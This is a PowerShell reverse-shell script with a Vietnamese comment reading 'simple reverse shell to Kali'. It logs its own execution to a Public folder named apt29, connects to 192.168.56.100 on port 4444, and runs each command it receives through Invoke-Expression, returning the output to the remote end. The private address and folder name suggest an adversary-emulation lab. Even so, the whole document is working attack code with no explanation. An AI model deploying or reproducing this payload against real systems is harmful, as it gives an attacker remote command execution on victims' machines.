# Reverse shell đơn giản về Kali
$PublicDir = "C:\Users\Public\apt29"
mkdir $PublicDir -Force -ErrorAction SilentlyContinue
"Reverse shell executed at $(Get-Date) - PID=$PID" |
    Out-File "$PublicDir\revshell.log" -Append

$client = New-Object System.Net.Sockets.TCPClient('192.168.56.100', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | %{0}
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
